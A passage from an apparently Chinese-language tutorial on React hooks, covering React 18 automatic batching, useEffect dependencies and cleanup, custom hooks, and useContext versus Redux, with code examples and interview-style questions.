align="left">批处理更新</td><td align="left">批处理更新</td></tr><tr><td align="left">函数式更新</td><td align="left">setCount(prev &#x3D;&gt; prev+1)</td><td align="left">this.setState(prev &#x3D;&gt; {})</td></tr><tr><td align="left">初始化</td><td align="left">支持惰性初始化函数</td><td align="left">构造函数中初始化</td></tr></tbody></table><h3 id="React-18-新特性：自动批处理"><a href="#React-18-新特性：自动批处理" class="headerlink" title="React 18 新特性：自动批处理"></a>React 18 新特性：自动批处理</h3><p><strong>批处理范围扩展</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React 17：只在事件处理函数中批处理</span><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setCount</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// 立即渲染</span><br>  <span class="hljs-title function_">setFlag</span>(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 再次渲染</span><br>&#125;, <span class="hljs-number">100</span>);<br><br><span class="hljs-comment">// React 18：自动批处理所有更新</span><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setCount</span>(<span class="hljs-number">1</span>);   <span class="hljs-comment">// 合并更新</span><br>  <span class="hljs-title function_">setFlag</span>(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 单次渲染</span><br>&#125;, <span class="hljs-number">100</span>);<br></code></pre></td></tr></table></figure><p><strong>紧急更新与非紧急更新</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; startTransition &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><br><span class="hljs-comment">// 紧急更新（用户输入）</span><br><span class="hljs-title function_">setInputValue</span>(input);<br><br><span class="hljs-comment">// 标记非紧急更新（搜索结果）</span><br><span class="hljs-title function_">startTransition</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setSearchQuery</span>(input);<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="3-2-useEffect-与副作用（依赖数组、清理函数）"><a href="#3-2-useEffect-与副作用（依赖数组、清理函数）" class="headerlink" title="3.2 useEffect 与副作用（依赖数组、清理函数）"></a>3.2 useEffect 与副作用（依赖数组、清理函数）</h2><h3 id="基础概念概述-5"><a href="#基础概念概述-5" class="headerlink" title="基础概念概述"></a>基础概念概述</h3><p>useEffect 作用：处理副作用操作：数据获取、订阅管理、手动 DOM 操作等</p><p>核心参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// 副作用逻辑</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">/* 清理函数 */</span> &#125;;<br>&#125;, [dependencies]); <span class="hljs-comment">// 依赖数组</span><br></code></pre></td></tr></table></figure><p>执行时机:</p><ul><li>组件挂载后（componentDidMount）</li><li>依赖项变化时（componentDidUpdate）</li><li>组件卸载前执行清理（componentWillUnmount）</li></ul><h3 id="依赖数组深度解析"><a href="#依赖数组深度解析" class="headerlink" title="依赖数组深度解析"></a>依赖数组深度解析</h3><p><strong>三种依赖模式对比</strong></p><table><thead><tr><th align="left">依赖数组</th><th align="left">执行时机</th><th align="left">常见用途</th></tr></thead><tbody><tr><td align="left">[]</td><td align="left">仅挂载时执行一次</td><td align="left">初始化请求、事件订阅</td></tr><tr><td align="left">[dep1, dep2]</td><td align="left">依赖变化时执行</td><td align="left">数据请求、状态联动</td></tr><tr><td align="left">无依赖</td><td align="left">每次渲染后都执行</td><td align="left">极少使用（性能危险）</td></tr></tbody></table><p><strong>依赖项优化技巧</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 错误：缺少必要依赖</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">fetchData</span>(user.<span class="hljs-property">id</span>); <br>&#125;, []); <span class="hljs-comment">// 当 user.id 变化时不会重新请求</span><br><br><span class="hljs-comment">// ✅ 正确：包含所有依赖</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">fetchData</span>(user.<span class="hljs-property">id</span>);<br>&#125;, [user.<span class="hljs-property">id</span>]); <br><br><span class="hljs-comment">// ✅ 高级：函数式更新避免依赖</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>); <span class="hljs-comment">// 不依赖 count</span><br>  &#125;, <span class="hljs-number">1000</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(timer);<br>&#125;, []); <span class="hljs-comment">// 空依赖安全</span><br></code></pre></td></tr></table></figure><p><strong>依赖引用陷阱</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 问题：对象引用变化导致无限循环</span><br><span class="hljs-keyword">const</span> config = &#123; <span class="hljs-attr">timeout</span>: <span class="hljs-number">1000</span> &#125;;<br><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">startTimer</span>(config);<br>&#125;, [config]); <span class="hljs-comment">// 每次渲染 config 都是新对象</span><br><br><span class="hljs-comment">// ✅ 解决方案：useMemo 稳定引用</span><br><span class="hljs-keyword">const</span> config = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> (&#123; <span class="hljs-attr">timeout</span>: <span class="hljs-number">1000</span> &#125;), []);<br></code></pre></td></tr></table></figure><h3 id="清理函数高级用法"><a href="#清理函数高级用法" class="headerlink" title="清理函数高级用法"></a>清理函数高级用法</h3><p><strong>执行机制</strong></p><pre class="mermaid">sequenceDiagram  participant Mount as 组件挂载  participant Update as 依赖更新  participant Unmount as 组件卸载  Mount->>+Effect: 执行副作用  Update->>+Cleanup: 执行旧清理函数  Update->>+Effect: 执行新副作用  Unmount->>+Cleanup: 执行清理函数</pre><p><strong>常见清理场景</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. 清除定时器</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-comment">/*...*/</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(timer);<br>&#125;, []);<br><br><span class="hljs-comment">// 2. 取消网络请求</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();<br>  <span class="hljs-title function_">fetch</span>(url, &#123; <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span> &#125;);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> controller.<span class="hljs-title function_">abort</span>(); <span class="hljs-comment">// 取消未完成请求</span><br>&#125;, [url]);<br><br><span class="hljs-comment">// 3. 移除事件监听</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleResize</span> = (<span class="hljs-params"></span>) =&gt; &#123;<span class="hljs-comment">/*...*/</span>&#125;;<br>  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;resize&#x27;</span>, handleResize);<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;resize&#x27;</span>, handleResize);<br>&#125;, []);<br></code></pre></td></tr></table></figure><p><strong>清理函数闭包特性</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count); <span class="hljs-comment">// 总是初始值（闭包陷阱）</span><br>  &#125;, <span class="hljs-number">1000</span>);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(timer);<br>&#125;, []);<br><br><span class="hljs-comment">// ✅ 解决方案：使用 ref 保存最新值</span><br><span class="hljs-keyword">const</span> countRef = <span class="hljs-title function_">useRef</span>(count);<br>countRef.<span class="hljs-property">current</span> = count;<br><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(countRef.<span class="hljs-property">current</span>); <span class="hljs-comment">// 最新值</span><br>  &#125;, <span class="hljs-number">1000</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(timer);<br>&#125;, []);<br></code></pre></td></tr></table></figure><h3 id="高频面试题与破解方案-7"><a href="#高频面试题与破解方案-7" class="headerlink" title="高频面试题与破解方案"></a>高频面试题与破解方案</h3><p><strong>Q：如何避免 useEffect 无限循环？</strong></p><p>常见原因：</p><ul><li>副作用内更新依赖项状态</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 危险：更新状态触发重渲染</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>); <br>&#125;, [count]); <span class="hljs-comment">// 每次count变化又触发</span><br></code></pre></td></tr></table></figure><ul><li>依赖引用类型未优化</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 对象字面量导致无限循环</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// ...</span><br>&#125;, [&#123; data &#125;]); <span class="hljs-comment">// 每次新对象</span><br></code></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ✅ 方案1：检查依赖链，移除不必要的状态更新</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (needsUpdate) <span class="hljs-title function_">fetchData</span>(); <span class="hljs-comment">// 条件执行</span><br>&#125;, [data]);<br><br><span class="hljs-comment">// ✅ 方案2：使用 useMemo 稳定依赖</span><br><span class="hljs-keyword">const</span> stableData = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> data, [data.<span class="hljs-property">id</span>]);<br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<span class="hljs-comment">/*...*/</span>&#125;, [stableData]);<br></code></pre></td></tr></table></figure><p><strong>Q：为什么严格模式下 useEffect 执行两次？</strong></p><p>React 18 严格模式行为：</p><ul><li>开发环境故意双调用组件（挂载 → 卸载 → 挂载）</li><li>目的：暴露未正确清理的副作用</li><li>生产环境无此行为</li></ul><p>正确应对：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> connection = <span class="hljs-title function_">createConnection</span>();<br>  connection.<span class="hljs-title function_">connect</span>();<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> connection.<span class="hljs-title function_">disconnect</span>(); <span class="hljs-comment">// ✅ 确保完全清理</span><br>&#125;, []);<br></code></pre></td></tr></table></figure><p><strong>Q：useEffect 和 useLayoutEffect 有何区别？</strong></p><table><thead><tr><th align="left">特性</th><th align="left">useEffect</th><th align="left">useLayoutEffect</th></tr></thead><tbody><tr><td align="left">执行时机</td><td align="left">浏览器绘制后异步执行</td><td align="left">DOM 更新后，绘制前同步执行</td></tr><tr><td align="left">阻塞渲染</td><td align="left">否</td><td align="left">是</td></tr><tr><td align="left">使用场景</td><td align="left">数据获取、订阅等</td><td align="left">DOM 测量、同步样式变更</td></tr><tr><td align="left">服务端渲染</td><td align="left">正常执行</td><td align="left">警告（需用 useEffect 替代）</td></tr></tbody></table><h3 id="自定义-Hook-封装"><a href="#自定义-Hook-封装" class="headerlink" title="自定义 Hook 封装"></a>自定义 Hook 封装</h3><p><strong>通用数据请求 Hook</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useFetch</span>(<span class="hljs-params">url, initialData</span>) &#123;<br>  <span class="hljs-keyword">const</span> [data, setData] = <span class="hljs-title function_">useState</span>(initialData);<br>  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> isActive = <span class="hljs-literal">true</span>;<br>    <br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>      <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">true</span>);<br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url);<br>        <span class="hljs-keyword">if</span> (isActive) <span class="hljs-title function_">setData</span>(<span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>());<br>      &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">if</span> (isActive) <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>);<br>      &#125;<br>    &#125;;<br>    <br>    <span class="hljs-title function_">fetchData</span>();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123; isActive = <span class="hljs-literal">false</span> &#125;;<br>  &#125;, [url]);<br>  <br>  <span class="hljs-keyword">return</span> &#123; data, loading &#125;;<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">const</span> &#123; data, loading &#125; = <span class="hljs-title function_">useFetch</span>(<span class="hljs-string">&#x27;/api/user&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>事件监听 Hook</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useEventListener</span>(<span class="hljs-params">eventName, handler, element = <span class="hljs-variable language_">window</span></span>) &#123;<br>  <span class="hljs-keyword">const</span> savedHandler = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    savedHandler.<span class="hljs-property">current</span> = handler;<br>  &#125;, [handler]);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">eventListener</span> = e =&gt; savedHandler.<span class="hljs-title function_">current</span>(e);<br>    element.<span class="hljs-title function_">addEventListener</span>(eventName, eventListener);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> element.<span class="hljs-title function_">removeEventListener</span>(eventName, eventListener);<br>  &#125;, [eventName, element]);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-3-useContext-与全局状态共享"><a href="#3-3-useContext-与全局状态共享" class="headerlink" title="3.3 useContext 与全局状态共享"></a>3.3 useContext 与全局状态共享</h2><h3 id="基础概念概述-6"><a href="#基础概念概述-6" class="headerlink" title="基础概念概述"></a>基础概念概述</h3><p>useContext 作用：解决组件跨层级通信问题，避免 Props drilling（属性钻探）</p><p>核心三要素</p><ul><li>React.createContext()：创建上下文对象</li><li><code>&lt;Context.Provider&gt;</code>：提供数据</li><li>useContext()：消费数据</li></ul><p>典型场景:主题切换、用户认证、多语言、全局配置等跨组件共享数据</p><h3 id="上下文工作流程详解"><a href="#上下文工作流程详解" class="headerlink" title="上下文工作流程详解"></a>上下文工作流程详解</h3><pre class="mermaid">graph TD  A[创建Context] --> B[Provider 提供数据]  B --> C[子组件消费数据]  C --> D{消费方式}  D --> E[useContext Hook]  D --> F[Context.Consumer]  D --> G[Class.contextType]</pre><p>完整使用示例:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. 创建上下文</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-string">&#x27;light&#x27;</span>); <span class="hljs-comment">// 默认值</span><br><br><span class="hljs-comment">// 2. Provider 提供数据</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;dark&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">theme</span>, <span class="hljs-attr">setTheme</span> &#125;&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Content</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 3. 函数组件消费</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; theme &#125; = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">header</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span>标题<span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// 4. 类组件消费</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Content</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-keyword">static</span> contextType = <span class="hljs-title class_">ThemeContext</span>; <span class="hljs-comment">// 类组件绑定</span><br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> &#123; theme &#125; = <span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">main</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span>内容<span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span></span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高级应用模式"><a href="#高级应用模式" class="headerlink" title="高级应用模式"></a>高级应用模式</h3><p><strong>自定义 Hook 封装</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 创建自定义上下文 Hook</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useTheme</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> context = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);<br>  <span class="hljs-keyword">if</span> (!context) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;useTheme 必须在 ThemeProvider 内使用&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> context;<br>&#125;<br><br><span class="hljs-comment">// 在组件中使用</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemedButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; theme, toggleTheme &#125; = <span class="hljs-title function_">useTheme</span>();<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;toggleTheme&#125;</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span></span><br><span class="language-xml">      切换主题</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高频面试题与破解方案-8"><a href="#高频面试题与破解方案-8" class="headerlink" title="高频面试题与破解方案"></a>高频面试题与破解方案</h3><p><strong>Q：Context 与 Redux 如何选择？</strong></p><p>决策矩阵：</p><table><thead><tr><th align="left">考量因素</th><th align="left">Context</th><th align="left">Redux</th></tr></thead><tbody><tr><td align="left">使用复杂度</td><td align="left">简单</td><td align="left">复杂（action&#x2F;reducer）</td></tr><tr><td align="left">性能优化</td><td align="left">需手动优化</td><td align="left">内置精细更新</td></tr><tr><td align="left">中间件支持</td><td align="left">不支持</td><td align="left">支持（thunk&#x2F;saga）</td></tr><tr><td align="left">调试工具</td><td align="left">无</td><td align="left">Redux DevTools</td></tr><tr><td align="left">适用场景</td><td align="left">低频更新数据（主题&#x2F;用户）</td><td align="left">高频更新&#x2F;复杂状态逻辑</td></tr></tbody></table><p>总结：</p><ul><li>中小应用：Context + useReducer</li><li>大型应用：Redux&#x2F;Zustand</li></ul><p><strong>Q：为什么 Context 会导致不必要的重渲染？</strong></p><p>根本原因：</p><p>Context 使用 值比较（value comparison），当 Provider 的 value 变化时，所有消费该 Context 的组件都会重渲染，无论是否使用变化的部分。</p><p>解决方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. 拆分 Context（如前文示例）</span><br><span class="hljs-comment">// 2. 使用 React.memo 优化子组件</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ExpensiveComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">() =&gt;</span> &#123; ... &#125;);<br><br><span class="hljs-comment">// 3. 使用选择器库（use-context-selector）</span><br></code></pre></td></tr></table></figure><p><strong>Q：如何检测 Context 未提供？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 创建时设置默认值（生产环境有用）</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title function_">createContext</span>(<span class="hljs-string">&#x27;light&#x27;</span>);<br><br><span class="hljs-comment">// 自定义 Hook 添加检测</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useTheme</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> context = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);<br>  <br>  <span class="hljs-keyword">if</span> (context === <span class="hljs-literal">undefined</span>) &#123; <span class="hljs-comment">// 未提供时使用默认值</span><br>    <span class="hljs-keyword">return</span> <span 